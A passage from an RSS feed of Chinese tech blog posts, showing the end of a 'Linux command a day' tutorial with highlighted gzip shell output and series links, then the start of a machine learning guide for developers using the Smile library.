&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2015&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b87339546076-14&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b87339546076-15&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2016&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b87339546076-16&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b87339546076-17&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;    &lt;span class=&quot;crayon-cn&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2017&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.gz&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b87339546076-18&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b87339546076-19&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# cd ..&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b87339546076-20&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b87339546076-21&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# gzip -dr test6&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b87339546076-22&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b87339546076-23&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# cd test6&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b87339546076-24&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b87339546076-25&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ll&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b87339546076-26&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b87339546076-27&quot;&gt;总计 &lt;span class=&quot;crayon-cn&quot;&gt;604&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b87339546076-28&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b87339546076-29&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;302108&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;linklog&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b87339546076-30&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b87339546076-31&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;302108&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2012&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b87339546076-32&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b87339546076-33&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;     &lt;span class=&quot;crayon-cn&quot;&gt;61&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b87339546076-34&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b87339546076-35&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;       &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2014&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b87339546076-36&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b87339546076-37&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;       &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2015&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b87339546076-38&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b87339546076-39&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;       &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2016&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b87339546076-40&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b87339546076-41&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;       &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2017&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b87339546076-42&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b87339546076-43&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;#&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0080 seconds] --&gt;
&lt;p&gt;&lt;/p&gt;
&lt;h3&gt;本系列文章：&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.jobbole.com/108531/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（1）：ls命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108805/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（2）：cd命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108855/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（3）：pwd命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108871/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（4）：mkdir命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108901/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（5）：rm 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108925/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（6）：rmdir 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108983/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（7）：mv命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108988/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（8）：cp 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108989/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（9）：touch 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108990/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（10）：cat 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108991/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（11）：nl 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108992/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（12）：more 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108993/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（13）：less 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108994/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（14）：head 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108995/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（15）：tail 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109262/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（16）：which命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108993/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（17）：whereis 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108994/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（18）：locate 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109265/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（19）：find 命令概览&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108996/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（20）：find命令之exec&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108997/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（21）：find命令之xargs&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109268/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（22）：find 命令的参数详解&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109506/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（23）：Linux 目录结构&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109254/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（24）：Linux 文件类型与扩展名&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/105269&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（25）：Linux 文件属性详解&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109539&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（26）：用 SecureCRT 来上传和下载文件&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109614&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（27）：linux chmod 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109674/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（28）：tar 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109696/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（29）: chgrp 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109750/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（30）: chown 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109781/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（31）: /etc/group 文件详解&lt;/a&gt;&lt;/p&gt;

        
        
        
    &lt;div class=&quot;post-adds&quot;&gt;
        &lt;span data-post-id=&quot;109797&quot; class=&quot; btn-bluet-bigger href-style vote-post-up   register-user-only &quot;&gt;&lt;i class=&quot;fa  fa-thumbs-o-up&quot;&gt;&lt;/i&gt; &lt;h10 id=&quot;109797votetotal&quot;&gt;1&lt;/h10&gt; 赞&lt;/span&gt;
        &lt;span data-book-type=&quot;1&quot; data-site-id=&quot;2&quot; data-item-id=&quot;109797&quot; data-item-type=&quot;1&quot; class=&quot; btn-bluet-bigger href-style bookmark-btn  register-user-only &quot;&gt;&lt;i class=&quot;fa fa-bookmark-o  &quot;&gt;&lt;/i&gt;  收藏&lt;/span&gt;

                    &lt;a href=&quot;#article-comment&quot;&gt;&lt;span class=&quot;btn-bluet-bigger href-style hide-on-480&quot;&gt;&lt;i class=&quot;fa fa-comments-o&quot;&gt;&lt;/i&gt;  评论&lt;/span&gt;&lt;/a&gt;
        
        
        
        &lt;!-- JiaThis Button BEGIN --&gt;
        &lt;div class=&quot;jiathis_style_24x24&quot; style=&quot;display: inline-flex; position: relative; margin: 0; clear: both;float: right;&quot;&gt;
            &lt;a class=&quot;jiathis_button_tsina&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_weixin&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_qzone&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_fb hide-on-480&quot;&gt;&lt;/a&gt;
            &lt;a href=&quot;http://www.jiathis.com/share?uid=1745061&quot; class=&quot;jiathis jiathis_txt jiathis_separator jtico jtico_jiathis&quot; target=&quot;_blank&quot;&gt;&lt;/a&gt;
        &lt;/div&gt;

    &lt;/div&gt;




        &lt;!-- BEGIN #author-bio --&gt;


&lt;!-- END #author-bio --&gt;
	

</description>
        <pubDate>Wed, 11 Jan 2017 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2017/2017-01-11-109797-a13725ea3.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2017/2017-01-11-109797-a13725ea3.html</guid>
        
        
        <category>jobbole</category>
        
      </item>
    
      <item>
        <title>面向开发人员的机器学习指南</title>
        <description>


        			&lt;div class=&quot;textwidget&quot;&gt;
&lt;/div&gt;
		
		&lt;p&gt;现如今，大多数的开发人员都听说过机器学习，但是当他们试图寻找捷径来学习这些技术时，却有很多人都对机器学习中的一些抽象概念望而却步，诸如&lt;a href=&quot;http://en.wikipedia.org/wiki/Regression_analysis&quot;&gt;&lt;strong&gt;回归&lt;/strong&gt;&lt;/a&gt;、&lt;a href=&quot;http://en.wikipedia.org/wiki/Unsupervised_learning&quot;&gt;&lt;strong&gt;无监督学习&lt;/strong&gt;&lt;/a&gt;、&lt;a href=&quot;http://en.wikipedia.org/wiki/Probability_density_function&quot;&gt;&lt;strong&gt;概率密度函数&lt;/strong&gt;&lt;/a&gt;和其他许多定义。如果诉诸于书本，代表著作有&lt;a href=&quot;http://www-bcf.usc.edu/~gareth/ISL/&quot;&gt;《An Introduction to Statistical Learning with Applications in R》&lt;/a&gt;与&lt;a href=&quot;http://shop.oreilly.com/product/0636920018483.do&quot;&gt;《Machine Learning for Hackers》&lt;/a&gt;，其中的实例是用 R 语言实现的。&lt;/p&gt;
&lt;p&gt;然而，R 实际上跟 Java、C#、Scala 等用于开发日常应用的编程语言不同。这也是本文采用 &lt;a href=&quot;https://github.com/haifengl/smile&quot;&gt;Smile&lt;/a&gt; 来介绍机器学习的原因，Smile 是关于机器学习的一个库，它可以在 Java 与 Scala 中使用，而这两种语言对大多数开发者来说至少是不陌生的。&lt;/p&gt;
